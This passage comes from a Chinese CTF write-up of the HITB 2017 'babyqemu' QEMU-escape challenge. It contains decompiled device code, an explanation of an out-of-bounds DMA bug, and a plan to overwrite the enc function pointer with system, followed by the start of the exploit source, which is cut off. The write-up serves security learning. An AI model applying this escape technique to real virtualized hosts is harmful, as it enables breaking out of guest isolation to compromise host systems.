</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mi>1u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>qemu_cond_signal</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_cond</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ol><li><p><code>addr==0x80 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.src</p></li><li><p><code>addr==0x84 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.src高地址处的4byte。</p><p>（指向无定义空间，从上面dms_state的定义可以看出，其中的成员8字节对齐</p></li><li><p><code>addr==0x88 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.dst</p></li><li><p><code>addr==0x8c && dma.cmd&amp;1==0</code> &mdash;&ndash;> 同上</p></li><li><p><code>addr==0x90 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.cnt</p></li><li><p><code>addr==0x98 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.cmd，最低位需为1。同时<code>timer_mod</code>启动定时器，会触发<code>hitb_dma_timer</code></p></li></ol><p><code>hitb_dma_timer</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_dma_timer</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>dma_addr_t</span> <span class=n>cmd</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>addr</span><span class=p>;</span> <span class=c1>// rsi
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>dma_addr_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>dma_addr_t</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span> <span class=c1>// rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>cmd</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=nf>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x40000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=nf>enc</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// 这里的反编译很崎岖，但是看反汇编还是可以看出来和读的操作是一致的
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// 即：addr-0x40000作为idx，索引dma_buf
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>v6</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=p>[</span><span class=mh>0xFFFFFFDBLL</span><span class=p>].</span><span class=n>dma_buf</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mh>0x510</span><span class=p>];</span>  
</span></span><span class=line><span class=cl>      <span class=nf>LODWORD</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>opaque</span> <span class=o>+</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>-</span> <span class=mh>0x40000</span> <span class=o>+</span> <span class=mh>0xBB8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>v6</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=nf>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=p>,</span> <span class=kt>dma_addr_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>enc</span><span class=p>)(</span><span class=n>v6</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFELL</span><span class=p>;</span>  <span class=c1>// 把最低bit清掉了。又可以再次写入了
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=n>v5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=mh>0x100u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>cmd的bit含义</p><ol><li>bit1 &mdash;&ndash;> 是否为合规cmd（推测</li><li>bit2 &mdash;&ndash;> dma.dst向dma.src拷贝，还是相反方向</li><li>bit3 &mdash;&ndash;> 是否使用enc函数加密</li></ol><p><code>cpu_physical_memory_rw</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// qemu-5.1.0/exec.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>MemTxResult</span> <span class=nf>address_space_rw</span><span class=p>(</span><span class=n>AddressSpace</span> <span class=o>*</span><span class=n>as</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MemTxAttrs</span> <span class=n>attrs</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                             <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>is_write</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nf>address_space_write</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nf>address_space_read_full</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>address_space_rw</span><span class=p>(</span><span class=o>&amp;</span><span class=n>address_space_memory</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MEMTXATTRS_UNSPECIFIED</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                     <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>,</span> <span class=n>is_write</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>is_write==1</code>: 从buf读取len，写入物理地址addr。</p><p><code>is_write==0</code>: 从物理地址addr读取，写入buf。</p><h2 id=漏洞点>漏洞点<a hidden class=anchor aria-hidden=true href=#漏洞点>#</a></h2><p>在DMA的read和write中存在越界。</p><h2 id=exploit>exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p>从<code>HitbState</code>可以看出，成员<code>dma_buf</code>后方紧跟<code>enc</code>函数指针。</p><p>读取<code>enc</code>的函数地址，通过偏移得到<code>system@plt.got</code>的地址，写入到<code>enc</code>。</p><p>写入<code>cat flag</code>字符串，使<code>enc</code>以这个字符串来调用。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/qemu_pwn/HITB_GSEC_2017_babyqemu/exp.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PAGE_SHIFT 12
</span></span></span><span class=line><span class=cl><span class=cp>#define DMA_BASE 0x40000
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>iomem</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>dmabuf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=n>dmabuf_phys_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>virt2phys</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>virt</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>((</span><span class=n>virt</span><span class=o>&amp;</span><span class=mh>0xfff</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;open2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>virt</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>PAGE_SHIFT</span><span class=o>-</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>phys</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>phys</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;read&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>63</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>phys</span> <span class=o>=</span> <span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>54</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>phys</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>iowrite</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>ioread</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
